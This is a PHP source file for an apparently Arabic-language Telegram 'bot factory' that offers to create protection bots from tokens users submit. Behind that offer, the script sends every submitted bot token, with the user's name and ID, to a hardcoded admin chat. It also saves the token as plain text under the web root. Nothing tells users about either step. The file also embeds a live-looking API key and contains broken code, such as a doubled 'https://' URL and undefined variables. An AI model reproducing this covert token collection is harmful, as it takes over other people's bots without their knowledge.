/* developer MostafaSyrian channel @Bots_Syria*/
/* ليعمل الملف بشكل صحيح الرقم 23 معرف قناتك ورقم 24 ايديك و الرقم 100 رابط استضافتك محل nndnd.cf */
<?php 

ob_start();

define('API_KEY','1927472437:AAHqs52mORC62eL4tcGwovyNbyelAtAbOIk');

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($datas));
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
//======================================================
$ch = "@jeccc";
$admin = 1189284654;
//======================================================
$update = json_decode(file_get_contents('php://input'));
$message = $update->message; $chat_id = $message->chat->id;
$from_id = $message->from->id; $name = $message->from->first_name; $text = $message->text;
$mid = $message->message_id; $name2 = $update->callback_query->from->first_name; $message_id2 = $update->callback_query->message->message_id; $chat_id2 = $update->callback_query->message->chat->id;
$from_id2 = $update->callback_query->from->id; $message_id = $update->callback_query->message->message_id; $data = $update->callback_query->data;
$info_token = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo"); $info_tokens = json_decode($info_token);
$get_files = file_get_contents('security.php'); $get_done = file_get_contents('infos/explode.php');
$done = explode("\n", $get_done);
$get_id = file_get_contents('infos/info.php'); $get_ids = explode("\n", $get_id);
$from_id = $message->from->id;
mkdir("infos");
mkdir("security");
$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$ch&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
⚙| عذرا عزيزي يجب عليك الاشتراك
☑️| في قناة البوت اولا $ch
✔️| ثم اضغط او ارسل امر /start
",
]);return false;}
if($text == '/start' and !in_array($from_id, $get_ids)){ bot('sendMessage',[
'chat_id'=>$chat_id,'text'=>"
👋🏻¦ اهلا بك يا [$name](tg://user?id=$from_id)  في بوت
🛠¦ مصنع بوتات الحماية المميز والحصري
📝¦ لصنع بوت حماية خاص بك إضغط على صنع بوت 
[♻️إضغط هنا وتابع جديدنا♻️](https://t.me/Bots_Syria)
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'🔧 - صنع بوت - 🔧','callback_data'=>'addbot'],['text'=>'🗑 - حذف بوت - 🗑','callback_data'=>'delete']],[['text'=>'📝 - كيف اصنع بوت - 📝','callback_data'=>'help']],[['text'=>'📡 - إضغط هنا وتابع جديدنا - 📡','url'=>'https://t.me/Bots_Syria']],],])]);}
if($data == 'addbot' and !in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){file_put_contents('infos/info.php', "\n" . $chat_id2 . "\n",FILE_APPEND); bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"- قم بأرسال توكن البوت يمكنك الحصول عليه من خلال @BotFather 🛠 ؛",'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'↩️ - تراجع - ↪️','callback_data'=>'cancle']]]])]);}

if($data == 'addbot' and in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){
bot('answerCallbackQuery',['callback_query_id'=>$update->callback_query->id,'message_id'=>$message_id,'text'=>"- لا يمكنك إنشاء أكثر من بوت ✖️ ؛",'show_alert'=>true]);}
if($text and in_array($from_id, $get_ids) and $info_tokens->ok == "true" ){
for($i = $mid - 3; $i < $mid; $i++){bot('deleteMessage',[
'chat_id'=>$chat_id,'message_id'=>$i]);}
$str = str_replace($from_id, '', $get_id);    
file_put_contents('infos/info.php', $str);    
file_put_contents('infos/explode.php', $from_id . "\n", FILE_APPEND);
$url_info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$json_info = json_decode($url_info);
$userr = $json_info->result->username;
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"
- تم صنع بوت الخاص بك يمكنك ؛
- لدخول إلى البوت الخاص بك إضغط على الزر في الأسفل ⬇️ ؛ 
",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>'الصفحة الرئيسية 🏠️','callback_data'=>"home"]],
[['text'=>'🤖 إضغط هنا لدخول إلى البوت ؛','url'=>"https://t.me/$userr"]],]])]); 
bot('sendMessage',['chat_id'=>$admin,'text'=>"
 👨‍🎤 - هناك عضو صنع بوت حماية ؛ 
➖➖➖
 🙎‍♂ - اسم العضو  [$name](tg://user?id=$from_id)
➖➖➖
〽️ - معرف العضو [@$username](tg://user?id=$from_id)
➖➖➖
⚜ - ايدي العضو [$from_id](tg://user?id=$from_id)

➖➖➖
🔰 - توكن البوت
 
$text
➖➖➖
",
'disable_web_page_preview'=>'true','parse_mode'=>"Markdown",]);
mkdir("security/$from_id");
file_put_contents("security/$from_id/info.php",$text . "\n" . $from_id);

file_put_contents("security/$from_id/bot.php", $get_files);

file_put_contents("security/$from_id/chat.php", $from_id . "\n");

file_get_contents("https://api.telegram.org/bot$text/setwebhook?url=https://nndnd.cf/ooo/security/$from_id/bot.php");}

file_put_contents("security/index.php","Errors");
if($text and in_array($from_id, $get_ids) and $info_tokens->ok != "true" and !strpos($ch1 , '"status":"left"') !== false){
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"- عذراً❗️هاذا التوكن غير صالح ⚠️ ؛",'reply_to_message_id'=>$message->message_id,'reply_markup'=>json_encode([
'inline_keyboard'=>[[['text'=>'↩️ - تراجع - ↪️','callback_data'=>'cancle']]]])]);} 
if($data == 'cancle' and in_array($from_id, $get_ids)){
$str = str_replace($chat_id2, "", $get_id) ;
file_put_contents('infos/info.php', $str);
bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"
👋🏻¦ اهلا بك يا [$name2](tg://user?id=$from_id2)  في بوت
🛠¦ مصنع بوتات الحماية المميز والحصري
📝¦ لصنع بوت حماية خاص بك إضغط على صنع بوت 
[♻️إضغط هنا وتابع جديدنا♻️](https://t.me/Bots_Syria)
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'🔧 - صنع بوت - 🔧','callback_data'=>'addbot'],['text'=>'🗑 - حذف بوت - 🗑','callback_data'=>'delete']],[['text'=>'📝 - كيف اصنع بوت - 📝','callback_data'=>'help']],[['text'=>'📡 - إضغط هنا وتابع جديدنا - 📡','url'=>'https://t.me/Bots_Syria']],],])]);}
if($data == 'home'){
bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"
👋🏻¦ اهلا بك يا [$name2](tg://user?id=$from_id2)  في بوت
🛠¦ مصنع بوتات الحماية المميز والحصري
📝¦ لصنع بوت حماية خاص بك إضغط على صنع بوت 
[♻️إضغط هنا وتابع جديدنا♻️](https://t.me/Bots_Syria)
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'🔧 - صنع بوت - 🔧','callback_data'=>'addbot'],['text'=>'🗑 - حذف بوت - 🗑','callback_data'=>'delete']],[['text'=>'📝 - كيف اصنع بوت - 📝','callback_data'=>'help']],[['text'=>'📡 - إضغط هنا وتابع جديدنا - 📡','url'=>'https://t.me/Bots_Syria']],],])]);}
if($data == 'help'){
bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"
• طريقة صنع بوت بالتفصيل .

سنقوم بالدخول الى الـ BotFather وهو عبارة عن بوت الإنشاء التابع لتيلجرام لإنشاء بوت تيليجرام وذلك عن طريق المعرف الأتي ؛
@BotFather

• بعد الدخول الى البوت كالأتي ؛

- نضغط على /start لبدء انشاء البوت ، ثم ستظهر لنا واجهة البوت نقوم بالضغط على  ( /newbot  )
- بعد اختيار  ( /newbot )  والتي تقوم بدورها بالبدء بإنشاء البوت ؛
- هنا يخبرنا ان نقوم بإدخال اسم البوت قم بإختيار اسم للبوت الذي تريده مثال انا سأقوم بإختيار اسم المطور مصطفى كالصورة اعلاه انظر معي ؛

- ارسل اليوزر ( معرف ) بدون @ وفي نهايه المعرف كلمه ( bot ) ؛

- يرسلك رساله مثل الصوره في الاعلى هذا هو التوكن يبدا من الرقم 
التوكن .

﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'الصفحة الرئيسية 🏠️','callback_data'=>'home']],[['text'=>'📡 - إضغط هنا وتابع جديدنا - 📡','url'=>'https://t.me/Bots_Syria']],],])]);}
//========================================================================
if($data == 'delete' and in_array($chat_id2,$done)){bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>'هل انت متأكد ⁉️ من انك تريد حذف البوت 🗑','reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'↩️ - تراجع - ↪️', 'callback_data'=>'home'],['text'=>'✔️ - نعم بالتأكيد - ✔️','callback_data'=>'yesdel'],]]])]);}
if($data == 'yesdel' and in_array($chat_id2, $done)){bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"- تم حذف البوت بنجاح 🗑 ؛",'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'الصفحة الرئيسية 🏠️','callback_data'=>"home"]]]])]);
$str1 = str_replace($chat_id2, '', $get_done);
file_put_contents('infos/explode.php', $str1);
$get_token = file_get_contents("security/$chat_id2/info.php");
$get_url = file_get_contents("https://api.telegram.org/bot$get_token/getWebhookInfo");
$json = json_decode($get_url);
$url = $json->result->url;
file_get_contents("https://https://api.telegram.org/bot$get_token/deletewebhook?url=$url");
unlink("security/$chat_id2/bot.php");
unlink("security/$chat_id2/info.php");}
if($data == 'delete' and !in_array($chat_id2,$done)){bot('answerCallbackQuery',['callback_query_id'=>$update->callback_query->id,'message_id'=>$message_id,'text'=>"- إصنع بوت أولاً ⚜ ؛",'show_alert'=>true]);}
echo "Errors No found";